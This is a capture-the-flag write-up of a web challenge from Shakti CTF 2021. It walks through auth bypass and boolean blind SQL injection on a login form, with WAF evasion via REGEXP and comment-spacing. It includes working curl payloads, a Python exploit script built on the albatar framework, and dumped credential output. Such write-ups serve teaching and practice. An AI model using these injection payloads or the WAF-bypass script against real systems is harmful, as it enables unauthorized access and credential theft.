---
layout: post
title: Shakti CTF 2021 - Art Gallery 2 [web]
author: lanjelot
tags: [ctf, Shakti CTF, web]
---

 * Competition: [Shakti CTF 2021](https://ctftime.org/event/1251)
 * Challenge Name: Art Gallery 2
 * Type: Web
 * Points: 300 pts
 * Description: 
 > I'm on the way to open my very own Art Gallery. I can allow you to take a peak if you want. But not everyone though
 > Site: http://34.66.139.33/
 > Author: Nimisha

Exploiting a boolean SQLi without `WHERE` and the `[ &=]` characters using REGEXP and the [albatar](https://github.com/lanjelot/albatar) framework.

<!--more-->

We are presented with a simple login page:
![login page](https://i.imgur.com/3FQ6Co3.png)

No hints given in the source code:
```html
<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css">
  <link rel='stylesheet' href='style.css'>
</head>
<body>
  <div class="login">
    <h1>Login</h1>
    <form action="auth.php" method="POST">
      <label for="username">
        <i class="fas fa-user"></i>
      </label>
      <input type="text" name="username" placeholder="username" required>
      <label for="password">
        <i class="fas fa-lock"></i>
      </label>
      <input type="password" name="password" placeholder="password" required>
      <input type="submit" value="Login">
    </form>
  </div>
</body>
</html>
```

Tried a couple of default creds but no luck:
```http
HTTP/1.1 200 OK
Date: Sun, 04 Apr 2021 17:44:24 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 40
Connection: close
Content-Type: text/html; charset=UTF-8

Incorrect username or password or both??
```

The `admin` username triggers a WAF (in either params):
```console
$ curl --data-raw "username=admin&password=whatever" http://34.66.139.33/auth.php
<tr><td>ofcourse they're blocked</td></tr>
```

Sending the POST request to Burp scanner reveals that both params are vuln to SQLi:
```console
$ time curl -s -o/dev/null --data-raw "username=blah'%2b(select*from(select(sleep(2)))a)%2b'&password=x" http://34.66.139.33/auth.php 

real    0m2.259s
user    0m0.004s
sys     0m0.006s
```

We can bypass the auth via [implicit type conversion](http://vagosec.org/2013/04/mysql-implicit-type-conversion/):
```console
$ curl --data-raw "username=a'%2b'b&password=a'%2b'b" http://34.66.139.33/auth.php
welcome!!
```

Or by finding that `test` is a valid username and comment the rest of the query:
```console
$ curl --data-raw "username=test'#&password=whatev" http://34.66.139.33/auth.php
welcome!!
```

Once logged-in as `test'#` there is a link to a `/cart.php` page:
```html
<!DOCTYPE html>
<html>
<head>
  <title>Home</title>
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css">
  <link rel='stylesheet' href='common.css'>
</head>
<body class="loggedin">
  <nav class="navtop">
    <div>
      <h1>Art Gallery</h1>
      <a href="home.php"><i class="fa fa-home" aria-hidden="true"></i>Home</a>
      <a href="logout.php"><i class="fas fa-sign-out-alt"></i>Logout</a>
    </div>
  </nav>
  <div class="content">
    <h2>Cart</h2>
    <div>
      <p>welcome back, test'# !</p>
      <table>
        <tr>
          <td>Username:</td>
          <td>test'#</td>
        </tr>
<!--        <tr>
          <td>Email:</td>
          <td></td>
        </tr>-->
      </table>    
    </div>
  </div>
</body>
</html>
```
But there is nothing else there so let's go back to the SQLi.

Turns out we actually have a boolean SQLi:
* `username=test'%2b(select*from(select('a'))a)#&password=` -> "welcome!!"
* `username=test'%2b(select*from(select('1'))a)#&password=` -> "Incorrect username or password or both??"

But the WAF is slightly annoying and because the `=` and `&` are blacklisted, I went with the REGEXP technique:
* `username=test'%2b(select*from(select(if(((select/**/'b')regexp/**/binary/**/'^b'),'a','1')))a)#` -> "welcome!!"
* `username=test'%2b(select*from(select(if(((select/**/'a')regexp/**/binary/**/'^b'),'a','1')))a)#` -> "Incorrect username or password or both??"

I wrote an exploit script using the [albatar](https://github.com/lanjelot/albatar) framework, which I specifically created to exploit intricate SQL injections.
```python
from albatar import *

PROXIES = {}#'http': 'http://127.0.0.1:8008', 'https': 'http://127.0.0.1:8008'}
HEADERS = ['User-Agent: Mozilla/5.0']

def test_state_grep(headers, body, time):
    if 'welcome!!' in body:
        return 1
    else:
        return 0 # 'Incorrect username or password or both??'

def bypass_waf(s):
    s = s.replace(' ', '/**/')
    return s

def mysql_boolean_regexp():

    def make_requester():
        return Requester_HTTP(
            proxies = PROXIES,
            headers = HEADERS,
            url = 'http://34.66.139.33/auth.php',
            body = "username=test${injection}&password=whatever",
            method = 'POST',
            response_processor = test_state_grep,
            tamper_payload = bypass_waf
        )
  
    # PoC: username=test'%2b(select*from(select(if(((select/**/'a')regexp/**/binary/**/'^b'),'a','1')))a)%23&password=
    template = "'+(select*from(select(if(((${query})regexp binary ${regexp}),'a','1')))a)#"
    return Method_regexp(make_requester, template, confirm_char=False)

sqli = MySQL_Blind(mysql_boolean_regexp())

for r in sqli.exploit():
    print(r)
```

Because the WAF blocks the `WHERE` keyword and some characters `[ &=]`, we need to:
* replace all spaces with `/**/`
* remove the `=` and `&` chars from our regexp search pattern
* use the `IN` keyword instead of `=` if we ever need to
* juggle with `count()` and `limit` instead of using `where`

Demo:
```console
$ python shakti.py -q "select count(concat_ws(0x3a,table_schema,table_name,column_name)) from information_schema.columns"
609
```

We know the tables we are interested in will be towards the last records after all the `information_schema` tables. We can find the offset via trial & error:
```console
$ python shakti.py -q "select concat_ws(0x3a,table_schema,table_name,column_name) from information_schema.columns limit 605,1"
info^C
$ python shakti.py -q "select concat_ws(0x3a,table_schema,table_name,column_name) from information_schema.columns limit 606,1"
cart:accounts:id
```

Sweet let's enum the other columns
```console
$ python shakti.py -q "select concat_ws(0x3a,table_schema,table_name,column_name) from information_schema.columns limit 607,1"
cart:accounts:username
$ python shakti.py -q "select concat_ws(0x3a,table_schema,table_name,column_name) from information_schema.columns limit 608,1"
cart:accounts:password
```

How many users are there?
```console
$ python shakti.py -q "select count(concat_ws(0x3a,username,password)) from cart.accounts"
2
```

Let's dump it all:
```console
$ python shakti.py -q "select concat_ws(0x3a,username,password) from cart.accounts limit 0,1"
test:test@dumbhack5
$ python shakti.py -q "select concat_ws(0x3a,username,password) from cart.accounts limit 1,1"
admin:shaktictf{7h3_w4r_0f_sql1_h4s_b3gun}
```

Flag was `shaktictf{7h3_w4r_0f_sql1_h4s_b3gun}`. And just FYI:
```
$ python shakti.py -b --current-db --current-user --hostname --dbs --user
03:25:41 albatar - Starting Albatar v0.1 (https://github.com/lanjelot/albatar) at 2021-04-05 03:25 AEST
03:25:41 albatar - Executing: 'SELECT VERSION()'
5.7.33-0ubuntu0.18.04.1
03:26:15 albatar - Executing: 'SELECT CURRENT_USER()'
dbadmin@localhost
03:26:40 albatar - Executing: 'SELECT DATABASE()'
cart
03:26:48 albatar - Executing: 'SELECT @@HOSTNAME'
web-sql1
03:27:01 albatar - Executing: ('SELECT COUNT(DISTINCT(grantee)) FROM information_schema.user_privileges', 'SELECT DISTINCT(grantee) FROM information_schema.user_privileges LIMIT ${row_pos},1')
03:27:04 albatar - count: 1
'dbadmin'@'localhost'
03:27:34 albatar - Executing: ('SELECT COUNT(schema_name) FROM information_schema.schemata', 'SELECT schema_name FROM information_schema.schemata LIMIT ${row_pos},1')
03:27:38 albatar - count: 2
information_schema
cart
03:28:11 albatar - Time: 0h 2m 30s
```

[@lanjelot](https://twitter.com/lanjelot)
